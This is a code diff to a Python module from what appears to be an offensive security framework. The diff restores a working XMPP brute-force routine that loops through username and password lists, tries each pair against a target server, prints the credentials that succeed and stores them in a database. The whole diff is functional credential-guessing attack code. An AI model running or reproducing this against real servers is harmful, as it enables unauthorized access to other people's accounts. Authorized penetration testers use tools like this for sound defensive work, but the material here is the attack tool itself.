@@ -15,8 +15,12 @@ import sys
 import time
 import socket
 from time import sleep
-#from core.lib.xmpp.client import Client
+from sleekxmpp.clientxmpp import ClientXMPP as Client
 from core.Core.colors import *
+from core.database.database_module import save_data
+from core.variables import database
+from core.methods.cache import targetname
+import inspect
 
 xmppuser = []
 xmpppass = []
@@ -26,30 +30,48 @@ searchinfo = "XMPP Bruteforce"
 properties = {}
 
 def xmppBrute0x00(ip, usernames, passwords, port, delay):
-    '''
-    client = Client(str(ip))
-    client.connect(server=(str(ip), port))
+    #client = Client(str(ip))
+    #client.connect(server=(str(ip), port))
+    found = False
     for username in usernames:
         for password in passwords:
             try:
+                client = Client(username, password)
+                client.connect((str(ip), port))
                 if client.auth(username, password):
                     client.sendInitPresence()
+                    found = True
+                    data = username + " : " + password
+                    save_data(database, module, lvl1, lvl2, lvl3, name, data)
                     print(G + ' [+] Username: %s | Password found: %s\n' % (username, password))
                     client.disconnect()
             except Exception as e:
                 print(R+" [-] Error caught! Name: "+str(e))
             except KeyboardInterrupt:
                 client.disconnect()
+                if not found:
+                    data = "Nothing found."
+                    save_data(database, module, lvl1, lvl2, lvl3, name, data)
                 sys.exit(1)
             except:
-                print(GR+ " [*] Checking : "+C+"Username: %s | "+B+"Password: %s "+R+"| Incorrect!\n" % (username, password))
+                print(GR+ " [*] Checking : "+C+"Username: {} | ".format(username)+B+"Password: {} ".format(password)+R+"| Incorrect!\n")
                 sleep(delay)
-    '''
-    print("broken xmpp lib")
+    if not found:
+        data = "Nothing found."
+        save_data(database, module, lvl1, lvl2, lvl3, name, data)
+    
                 
 def xmppbrute(web):
-
-    print(GR+' [*] Loading module...\n')
+    global name
+    name = targetname(web)
+    global lvl2
+    lvl2 = inspect.stack()[0][3]
+    global module
+    module = "VulnAnalysis"
+    global lvl1
+    lvl1 = "Brute Force Tools"
+    global lvl3
+    lvl3 = ""
     time.sleep(0.6)
     #print(R+'    =====================')
     #print(R+'\n     X M P P   B R U T E ')
